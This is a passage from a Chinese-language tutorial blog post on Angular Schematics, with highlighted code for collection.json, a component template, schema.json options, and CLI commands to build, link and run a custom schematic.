</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>通过 <code>ng g ng-alain:module &lt;name&gt;</code>（或 <code>ng g component &lt;name&gt;</code>）生成时将忽略测试文件；当然对于这些默认参数的转化都是 Schematics 内自动完成。这里ng-alain是阿里zorro的一个
Schematics Lib，和@schematics/angular有着一定相同的功能。</p> <p>下面这张图说明了当我们输入 ng g ng-zorro-antd:schematic2 时，Angular 如何找到对应的 schematic。</p> <p><img src="/vuebloger/img/post/v2-84ace8624bc29add43114407ac6a5f81_720w.jpg" alt=""></p> <p>Schematics 只是 @angular-devkit 中的一小部分而已，devkit还包括：Architect 用于改变 Angular cli 的运行机制，本质上是在改变 Webpack 配置文件.</p> <h3 id="schematics-cli"><a href="#schematics-cli" class="header-anchor">#</a> schematics-cli</h3> <p>Schematics提供了一个CLI。通过<code>npm i @angular-devkit/schematics-cli -g</code>安装即可。安装完毕之后可以通过<code>schematics blank --name=schematics-name</code>进行生成一个空的schmatics项目。</p> <p>安装完毕之后可以通过<code>schematics blank --name=schematics-name</code>进行生成一个空的schmatics项目后，我们可以来看看工程目录下的collection.json:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
    <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;../node_modules/@angular-devkit/schematics/collection-schema.json&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;schematics-name&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;A blank schematic.&quot;</span><span class="token punctuation">,</span>
          <span class="token string">&quot;factory&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./schematics-name/index#schematicsName&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>可以看到的是我们在&quot;schematics&quot;中定义了一个schematic。我们通常不会直接用这个空白的schematic，而是从@schematics/angular中复制并添加一个作为初始模版。</p> <p>通过使用npm i @schematics/angular命令我们将@schematics/angular安装到我们的这个schematics工程中，安装完成后可以去node-module中查看Angular提供了哪些预设好的schematics，比如我们最常用的component，然后复制到我们目录并修改collection.json和目录文件夹。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
    <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;../node_modules/@angular-devkit/schematics/collection-schema.json&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;schematics&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;my-component&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;My component based on Angular component schema .&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;factory&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./my-component&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;./my-component/schema.json&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><img src="/vuebloger/img/post/v2-c1f0fe4177536c5b68d8e2190f9685f7_720w.jpg" alt=""></p> <p>在上图中我们可以在my-component文件夹中有一个files文件夹，这个文件夹就存放了我们将要修改的component模版。我们可以看看__name@dasherize__.component.ts这个文件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span>viewEncapsulation<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> ViewEncapsulation <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>changeDetection <span class="token operator">!==</span> <span class="token string">'Default'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> ChangeDetectionStrategy <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
	selector<span class="token operator">:</span> <span class="token string">'&lt;%= selector %&gt;'</span><span class="token punctuation">,</span>
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>inlineTemplate<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
	    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
        &lt;p&gt;
          &lt;%= dasherize(name) %&gt; works!
        &lt;/p&gt;
      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
    <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
	    templateUrl<span class="token operator">:</span> <span class="token string">'./&lt;%= dasherize(name) %&gt;.component.html'</span><span class="token punctuation">,</span> 
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>inlineStyle<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
	    styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> 
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
	    styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./&lt;%= dasherize(name) %&gt;.component.&lt;%= styleext %&gt;'</span><span class="token punctuation">]</span> 
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span>viewEncapsulation<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
	    encapsulation<span class="token operator">:</span> ViewEncapsulation<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">%=</span> viewEncapsulation <span class="token operator">%</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>changeDetection <span class="token operator">!==</span> <span class="token string">'Default'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
	    changeDetection<span class="token operator">:</span> ChangeDetectionStrategy<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">%=</span> changeDetection <span class="token operator">%</span><span class="token operator">&gt;</span> 
	<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">classify</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span> Component <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
	<span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
	<span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>其实就是一些基本的模版语法，对CLI的传参进行判断，然后对模版做相应的处理。而参数的定义就在schema.json文件中。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
    <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;http://json-schema.org/schema&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;id&quot;</span><span class="token operator">:</span> <span class="token string">&quot;SchematicsAngularComponent&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;title&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Angular Component Options Schema&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;properties&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;path&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;format&quot;</span><span class="token operator">:</span> <span class="token string">&quot;path&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The path to create the component.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;visible&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;project&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The name of the project.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;$default&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token string">&quot;$source&quot;</span><span class="token operator">:</span> <span class="token string">&quot;projectName&quot;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;name&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The name of the component.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;$default&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token string">&quot;$source&quot;</span><span class="token operator">:</span> <span class="token string">&quot;argv&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;index&quot;</span><span class="token operator">:</span> <span class="token number">0</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;inlineStyle&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies if the style will be in the ts file.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;s&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;inlineTemplate&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies if the template will be in the ts file.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;t&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;viewEncapsulation&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies the view encapsulation strategy.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;enum&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;Emulated&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Native&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;None&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;v&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;changeDetection&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies the change detection strategy.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;enum&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;Default&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;OnPush&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Default&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;c&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;prefix&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The prefix to apply to generated selectors.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;oneOf&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
                    <span class="token string">&quot;maxLength&quot;</span><span class="token operator">:</span> <span class="token number">0</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                    <span class="token string">&quot;minLength&quot;</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                    <span class="token string">&quot;format&quot;</span><span class="token operator">:</span> <span class="token string">&quot;html-selector&quot;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;styleext&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The file extension to be used for style files.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token string">&quot;css&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;spec&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies if a spec file is generated.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;flat&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Flag to indicate if a dir is created.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;skipImport&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Flag to skip the module import.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;selector&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;format&quot;</span><span class="token operator">:</span> <span class="token string">&quot;html-selector&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;The selector to use for the component.&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;module&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Allows specification of the declaring module.&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;alias&quot;</span><span class="token operator">:</span> <span class="token string">&quot;m&quot;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&quot;export&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;boolean&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;default&quot;</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">&quot;description&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Specifies if declaring module exports the component.&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;required&quot;</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br></div></div><p>在schema.json文件中的properties和schema.d.ts就是对参数的定义。而对参数的处理，就在一堆类似&lt;% if (inlineTemplate) { %&gt;的模版语法中。甚至你会发现，file文件夹中文件名都可以作为一个参数进行处理。而处理的逻辑就在index.js中。你可以按照这个代码模版来创建你所需的代码生成器（我会参考这个js文件来写一个ts文件），然后通过npm run build进行编译。</p> <h3 id="schematics-cli使用实例"><a href="#schematics-cli使用实例" class="header-anchor">#</a> schematics-cli使用实例</h3> <p>接下来我们来体验创建一个简单的 scheamtics,首先需要安装全局依赖:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm install <span class="token operator">-</span>g @angular<span class="token operator">-</span>devkit<span class="token operator">/</span>schematics<span class="token operator">-</span>cli
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>之后使用下面的命令新建一个 scheamtics 项目</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>schematics schematic <span class="token operator">--</span>name my<span class="token operator">-</span>schematics
cd my<span class="token operator">-</span>schematics
npm install
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/vuebloger/img/post/v2-4cb2ecd83cc3bab68860f6f5a6d41b71_720w.jpg" alt=""></p> <p>这里 Schematics CLI 以及为我们创建了一个简单的 schematic，我们可以直接编译运行。</p> <h4 id="编译与调试"><a href="#编译与调试" class="header-anchor">#</a> 编译与调试</h4> <p>运行下面的命令编译 ts 文件，并使用 npm link 将 schematics 链接到全局（这样可以使我们在其它项目中使用未发布的包）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm run build # 编译 ts
npm link      # link 当前项目
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="使用-angular-cli-运行"><a href="#使用-angular-cli-运行" class="header-anchor">#</a> 使用 Angular CLI 运行</h4> <p>新建一个 Angular 项目，并且将刚才的 schematics link 入进来</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng <span class="token keyword">new</span> <span class="token class-name">schematics</span><span class="token operator">-</span>test # 新建一个 Angular 项目
cd schematics<span class="token operator">-</span>test     # 进入项目目录
npm link my<span class="token operator">-</span>schematics # 将上一步的 schematics link 进来
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>之后使用 ng generate 命令来运行 schematics</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ng g my<span class="token operator">-</span>schematics<span class="token operator">:</span>my<span class="token operator">-</span>full<span class="token operator">-</span>schematic <span class="token operator">--</span>name hello
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>现在你应该可以看到 Angular 项目目录多了几个文件</p> <p><img src="/vuebloger/img/post/v2-af6edf4b7f5bc81c40ee53863715466b_720w.jpg" alt=""></p> <p>我们已经知道如何在 Angular 项目中运行自定义 schematic 了，现在我们来创建一个生成 Angular 组件的 schematic</p> <h3 id="自定义schematics-lib"><a href="#自定义schematics-lib" class="header-anchor">#</a> 自定义Schematics Lib</h3> <h4 id="准备结构和依赖"><a href="#准备结构和依赖" class="header-anchor">#</a> 准备结构和依赖</h4> <p>我们先将 material2/src/lib/schematics 下的 utils 文件下载拷贝到 my-schematics/src 下。然后安装一下新的依赖</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>npm install parse5 @schematics<span class="token operator">/</span>angular <span class="token operator">--</span>save<span class="token operator">-</span>dev
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>接下来按照下面目录结构新建一个名为 my-component 的 schematic。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">.</span>
├── node_modules<span class="token operator">/</span>
├── src
│   ├── utils
│   ├── my<span class="token operator">-</span>component
│   │   ├── files
│   │   │   └── __path__
│   │   │       └── __name@dasherize@<span class="token keyword">if</span><span class="token operator">-</span>flat__
│   │   │           ├── __name@dasherize__<span class="token punctuation">.</span>component<span class="token punctuation">.</span>__styleext__
│   │   │           ├── __name@dasherize__<span class="token punctuation">.</span>component<span class="token punctuation">.</span>html
│   │   │           ├── __name@dasherize__<span class="token punctuation">.</span>component<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>ts
│   │   │           └── __name@dasherize__<span class="token punctuation">.</span>component<span class="token punctuation">.</span>ts
│   │   ├── index<span class="token punctuation">.</span>ts
│   │   ├── schema<span class="token punctuation">.</span>json
│   │   └── schema<span class="token punctuation">.</span>ts
│   └── collection<span class="token punctuation">.</span>json
├── <span class="token constant">README</span><span class="token punctuation">.</span>md
├── <span class="token keyword">package</span><span class="token punctuation">.</span>json
└── tsconfig<span class="token punctuation">.</span>json
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h4 id="修改文件"><a href="#修改文件" class="header-anchor">#</a> 修改文件</h4> <ol><li>collection.json
collection.json 中包含了我们提供的每个 schematic 位置。</li></ol> <ul><li>factory 字段指向需要执行的方法 (一般来说是 index.js 中默认导出的方法)</li> <li>schema 字段指向一个 JSON Schema 格式的 JSON 文件</li> <li>aliases 这条命令的缩写，比如    <code>ng g c [name]</code></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span>
  <span class="token string">&quot;$schema&quot;</span><span class="token operator">:</span> <span class="token string">&quot;../node_modules/@angular-devkit/schematics/collection-schema.json&quot;</span><span class="token punctuation">,</span>
